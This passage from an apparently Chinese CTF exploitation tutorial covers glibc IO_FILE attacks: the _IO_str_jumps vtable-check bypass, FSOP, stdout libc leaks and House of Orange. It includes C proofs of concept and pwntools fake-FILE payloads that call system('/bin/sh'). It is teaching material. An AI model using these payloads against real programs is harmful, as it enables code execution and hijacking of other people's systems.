<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[] = <span class="string">&quot;abcdefghi&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x8</span>;</span><br><span class="line">    fp-&gt;_flags |= <span class="number">0x800</span>;</span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">6</span>];</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123456abcdefghi</span><br></pre></td></tr></table></figure></div>

<h1 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="__IO_str_jumps"></a>__IO_str_jumps</h1><p>libc2.24 在 <code>IO_validate_vtable</code> 函数中对 <code>*vtable</code> 指针进行校验：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>vtable</code> 必须要满足 在 <code>__stop___IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，而我们伪造的vtable通常不满足这个条件。<br>但是 <code>_IO_str_jumps</code> 与 <code>__IO_wstr_jumps</code> 就位于 <code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，所以我们是可以利用他们来通过 <code>IO_validate_vtable</code> 的检测的,只需要将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code> 或 <code>__IO_wstr_jumps</code> 地址即可。<br>利用方式主要有针对 <code>__IO_str_jumps</code> 中的 <code>_IO_str_finsh</code> 函数和 <code>_IO_str_overflow</code> 两种。 </p>
<h2 id="确定-IO-str-jumps-地址"><a href="#确定-IO-str-jumps-地址" class="headerlink" title="确定 __IO_str_jumps 地址"></a>确定 __IO_str_jumps 地址</h2><p>由于 <code>_IO_str_jumps</code> 不是导出符号，<code>libc.sym[&quot;_IO_str_jumps&quot;]</code> 查不到，我们可以利用 <code>_IO_str_jumps</code> 中的导出函数例如 <code>_IO_str_underflow</code> 进行辅助定位。首先先得到 <code>_IO_str_underflow</code> 地址，然后查找所有指向该地址的指针。由于 <code>_IO_str_underflow</code> 在 <code>_IO_str_jumps</code> 的偏移为 0x20 ，并且 <code>_IO_str_jumps</code> 的地址大于 <code>_IO_file_jumps</code> 地址，因此可以在选择满足上述条件中最小的地址作为 <code>_IO_str_jumps</code> 的地址。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(IO_str_jumps)</span><br></pre></td></tr></table></figure></div>

<h2 id="io-str-finish"><a href="#io-str-finish" class="headerlink" title="io_str_finish"></a>io_str_finish</h2><p>libc 直到 2.27 版本（有些版本的 2.27 已经修复），<code>_IO_str_finish</code> 都是下面这种实现手段。也就是说，如果修改 <code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为 <code>system</code> 地址，然后修改 <code>fp-&gt;_IO_buf_base</code> 为 <code>/bin/sh</code> 字符串地址，然后触发程序执行 <code>_IO_str_finish</code> 函数就可以得到 shell 。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>具体的攻击流程如下：</p>
<ul>
<li>修改 <code>vatble</code> 指针<br>根据前面 FSOP 的思路，可以通过使程序执行 <code>_IO_flush_all_lockp</code> 函数，进而执行 <code>_IO_overflow</code> 。此时如果将 <code>vatble</code> 指针修改为指向 <code>&amp;_IO_str_jumps - 8</code> 的地址就可以执行 <code>_IO_str_finish</code> 。</li>
<li>伪造 <code>_IO_FILE</code><br>与 FSOP 基本一致。<ul>
<li>要满足 <code>fp-&gt;_IO_buf_base</code> 不为空，并且由于它作为 <code>fp-&gt;_s._free_buffer</code> 的第一个参数，因此可以使用 <code>/bin/sh</code> 的地址。</li>
<li><code>fp-&gt;_flags</code> 要不包含 <code>_IO_USER_BUF</code>，它的定义为 <code>#define _IO_USER_BUF 1</code>，即 <code>fp-&gt;_flags</code> 最低位为 <code>0</code> 。</li>
<li>缓冲区需要有数据，即 <code>_IO_write_base</code> &lt; <code>_IO_write_ptr</code> 。</li>
<li><code>_mode</code> 需要小于等于 0 。</li>
</ul>
</li>
<li>修改 <code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为 <code>system</code> 地址，即将 <code>fp+0xE8</code> 除的值改为 <code>system</code> 地址。</li>
<li>最后通过 <code>exit</code> 等手段使程序执行 <code>_IO_flush_all_lockp</code> 函数，最终得到 shell 。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/862c73e5bc9e2712ddb4c15d5403b61d.png"
                     
                ><br>下面举一个实际例子：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> i8;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//    i64 *fp = malloc(0x200);</span></span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;./123.txt&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    i64 libc_base = (i64) &amp;system - <span class="number">0x4F440</span>;</span><br><span class="line">    i64 bin_sh_addr = libc_base + <span class="number">0x1B3E9A</span>;</span><br><span class="line">    i64 IO_str_jump_addr = libc_base + <span class="number">0x3E8360</span>;</span><br><span class="line">    i64 fake_IO_file_jump_addr = IO_str_jump_addr - <span class="number">0x8</span>;</span><br><span class="line">    *(i64 *) fp &amp;= ~<span class="number">1ULL</span>;</span><br><span class="line">    *(i64 *) ((i8 *) fp + <span class="number">0xE8</span>) = (i64) &amp;system;<span class="comment">//((_IO_strfile *) fp)-&gt;_s._free_buffer</span></span><br><span class="line">    *(i64 *) ((i8 *) fp + <span class="number">0xD8</span>) = fake_IO_file_jump_addr;<span class="comment">//*vtable</span></span><br><span class="line">    *((i64 *) fp + <span class="number">24</span>) = <span class="number">0x0</span>;<span class="comment">//_mode</span></span><br><span class="line">    *((i64 *) fp + <span class="number">4</span>) = <span class="number">0x0</span>;<span class="comment">//_IO_write_base</span></span><br><span class="line">    *((i64 *) fp + <span class="number">5</span>) = <span class="number">0x1</span>;<span class="comment">//_IO_write_ptr</span></span><br><span class="line">    *((i64 *) fp + <span class="number">7</span>) = bin_sh_addr;<span class="comment">//_IO_buf_base</span></span><br><span class="line"><span class="comment">//    i64 *list_all_ptr = (i64 *) (libc_base + 0x3ec660);</span></span><br><span class="line"><span class="comment">//    list_all_ptr[0] = (i64) fp;</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>libc 版本为：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div>

<p>运行结果：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/adcefd5908c54681d743bb3400018f61.png"
                     
                ></p>
<h1 id="与堆利用结合"><a href="#与堆利用结合" class="headerlink" title="与堆利用结合"></a>与堆利用结合</h1><h2 id="泄露-libc-基址"><a href="#泄露-libc-基址" class="headerlink" title="泄露 libc 基址"></a>泄露 libc 基址</h2><p>对于没有输出功能的堆题，要想泄露 libc 基址就需要劫持 <code>_IO_2_1_stdout_</code> 结构体。<br>以这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_24e4e65752923db914c053bc9c26ffc9" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>为例，因为是 libc-2.23 版本，可以利用 fast bin attack 在 <code>_IO_2_1_stdout_-0x43</code> 处申请 fast bin。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/924cc5a0aa1ec3e3756ae5fc3e6a0d31.png"
                     
                ><br>之后修改 <code>_IO_write_base</code> 指针的最低 1 字节为 <code>\x88</code> 使其指向 <code>_chain</code> 变量，而 <code>_chain</code> 变量中存储了 <code>_IO_2_1_stdin_</code> 结构体地址，程序在下一次输出内容时会先将 write buf 中的内容输出出来，因此可以泄露 libc 基地址。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x33</span> + p32(<span class="number">0xfbad1880</span>) + <span class="string">&quot;;sh;&quot;</span> + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0x88</span>))  <span class="comment"># 5 write_base -&gt; _IO_2_1_stdin_</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/2af6c590bbb50328260ce32e7d38ff5f.png"
                     
                ></p>
<h2 id="伪造-vtable-劫持程序流程-1"><a href="#伪造-vtable-劫持程序流程-1" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h2><p>同样以前面这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_24e4e65752923db914c053bc9c26ffc9" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>为例，首先利用 fast bin attack 在 <code>_IO_2_1_stdout_+157</code> 地址处申请 0x60 大小的堆块。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/65a0b011d6a6872ad7aab1104bee6698.png"
                     
                ><br>由于 libc-2.23 版本没有 <code>_IO_vtable_check</code> 检查 <code>vtable</code> 地址，因此可以修改 <code>vtable</code> 指针指向事先在 bss 段伪造的 <code>vtable</code> 。在调用 IO 函数时会将 <code>_IO_2_1_stdout_</code> 结构体指针作为参数传入 <code>vtable</code> 中的函数，因此可以在 <code>_IO_2_1_stdout_</code> 结构体 flag 字段之后的 4 字节填充中写入 <code>;sh;</code> 来获取 shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/533cdb6b82f9b1138deb0bb8b155b770.png"
                     
                ></p>
<h2 id="FSOP-1"><a href="#FSOP-1" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP（ File Stream Oriented Programming ） 的核心思想就是劫持 <code>_IO_list_all</code> 指向伪造的 <code>_IO_FILE_plus</code> 。之后使程序执行 <code>_IO_flush_all_lockp</code> 函数。该函数会刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 <code>fflush</code> ，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code> 。</p>
<p>劫持 <code>_IO_list_all</code> 的方式有两种：</p>
<ul>
<li>覆盖 <code>_IO_2_1_stderr_</code> 结构体，也就是下面这个例子</li>
<li>利用例如 large bin attack 的攻击方法将 <code>_IO_list_all</code> 覆盖成一个 chunk 地址，然后在该 chunk 上伪造 IO_FILE 结构体。例如后面 House of Pig 就采用了这个方法。</li>
</ul>
<p>以这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/ciscn_2019_n_7" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>为例，需要通过任意地址写修改 <code>_IO_2_1_stderr</code> 结构体然后 exit 调用 <code>_IO_flush_all_lockp</code> 从而实现 FSOP 。</p>
<p>在劫持 <code>_IO_2_1_stderr</code> 时除了修改 <code>vtable</code> 指针指向伪造 <code>vtable</code> 外，要想调用 <code>_IO_overflow</code> ，还需要修改 <code>_IO_2_1_stderr</code> 以满足以下条件：</p>
<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
<p>因此不妨将 vtable 伪造在 <code>_IO_2_1_stderr + 0x10</code> 处使 <code>_IO_2_1_stderr</code> 的 <code>fp-&gt;_IO_write_ptr</code> 恰好对应于 <code>vtable</code> 的 <code>_IO_overflow</code> 。然后将 <code>fp-&gt;_IO_write_ptr</code> 写入 <code>system</code> 函数地址。由于 <code>_IO_overflow</code> 传入的参数为 <code>_IO_2_1_stderr</code> 结构体，因此将结构体其实位置处写入 <code>/bin/sh</code> 字符串。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/239cffc0aedd07f3224149566b2084ce.png"
                     
                ><br>IO_FILE 的伪造对应与代码中可以有如下定义：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span>  <span class="comment"># _flags, an magic number</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_base</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_base</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span>  <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])  <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">2</span>)  <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>)  <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span>  <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span>  <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>)  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>)  <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span>  <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>)  <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span>  <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x10</span>)  <span class="comment"># fake vtable</span></span><br></pre></td></tr></table></figure></div>

<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>house of orange 利用手法有两部分，前半部分是无 free 的情况下得到位于 unsorted bin 的 chunk ，后半部分是利用 unsorted bin attack 劫持 <code>_IO_list_all</code> 实现 FSOP 。</p>
<p>首先是第一部分。如果当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<p> 但是执行 sysmalloc 来向系统申请内存有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。这需要 malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure></div>

<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p>
<p>在 sysmalloc 函数中存在对 top chunk size 的 check 如下：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = <span class="built_in">chunksize</span>(old_top);</span><br><span class="line">old_end = (<span class="type">char</span> *) (<span class="built_in">chunk_at_offset</span>(old_top, old_size));</span><br><span class="line">...</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">assert</span>((old_top == <span class="built_in">initial_top</span>(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">       ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">        <span class="built_in">prev_inuse</span>(old_top) &amp;&amp;</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line"><span class="built_in">assert</span>((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>伪造的 top chunk 的结束位置必须要对齐到内存页(4k)</p>
</li>
<li><p>size 要大于 MINSIZE(0x10)</p>
</li>
<li><p>size 要小于之后申请的 chunk size + MINSIZE(0x10)</p>
</li>
<li><p>size 的 prev inuse 位必须为 1</p>
</li>
</ul>
<p>通过上述检查后会进行 brk 系统调用来扩展 heap 段。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If contiguous, we can subtract out existing space that we hope to</span></span><br><span class="line"><span class="comment">   combine with new space. We add it back later only if</span></span><br><span class="line"><span class="comment">   we don&#x27;t actually get contiguous space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (contiguous (av))</span><br><span class="line">  size -= old_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Round to a multiple of page size.</span></span><br><span class="line"><span class="comment">   If MORECORE is not contiguous, this ensures that we only call it</span></span><br><span class="line"><span class="comment">   with whole-page arguments.  And if MORECORE is contiguous and</span></span><br><span class="line"><span class="comment">   this is not first time through, this preserves page-alignment of</span></span><br><span class="line"><span class="comment">   previous calls. Otherwise, we correct to page-align below.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Don&#x27;t try to call MORECORE if argument is so big as to appear</span></span><br><span class="line"><span class="comment">   negative. Note that since mmap takes size_t arg, it may succeed</span></span><br><span class="line"><span class="comment">   below even if we cannot call MORECORE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">  